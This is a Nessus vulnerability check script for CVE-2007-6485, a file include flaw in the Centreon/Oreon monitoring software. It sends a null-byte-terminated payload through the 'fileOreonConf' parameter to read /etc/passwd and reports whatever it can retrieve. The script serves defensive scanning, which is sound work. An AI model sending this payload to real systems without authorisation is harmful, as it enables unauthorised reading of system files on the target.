#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29722);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-6485");
  script_bugtraq_id(26883);
  script_xref(name:"OSVDB", value:"39226");
  script_xref(name:"OSVDB", value:"39227");

  script_name(english:"Centreon fileOreonConf Parameter File Include Vulnerabilities");
  script_summary(english:"Tries to read a local file with Centreon");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Centreon or Oreon, a web-based network
supervision program based on Nagios. 

The version of Centreon / Oreon installed on the remote host fails to
sanitize user-supplied input to the 'fileOreonConf' parameter of the
'MakeXML.php' and 'MakeXML4statusCounter.php' scripts before using it
to include PHP code.  Regardless of PHP's 'register_globals' setting,
an unauthenticated remote attacker may be able to exploit these issues
to view arbitrary files on the remote host or to execute arbitrary PHP
code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4735" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


file = "/etc/passwd";
if (thorough_tests) 
{
  exploits = make_list(
    string("MakeXML.php?fileOreonConf=", file, "%00"),
    string("MakeXML4statusCounter.php?fileOreonConf=", file, "%00")
  );
}
else 
{
  exploits = make_list(
    string("MakeXML.php?fileOreonConf=", file, "%00")
  );
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/centreon", "/oreon", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  foreach exploit (exploits)
  {
    # Try to retrieve a local file.
    r = http_send_recv3(method:"GET", port: port, 
      item:string(dir, "/include/monitoring/engine/", exploit));
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error because magic_quotes was enabled or...
      string("main(", file, "\\0www/oreon.conf.php): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = res - strstr(res, 'Connecting problems with oreon database');
      }
      else contents = "";

      if (contents)
      {
        report = string(
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
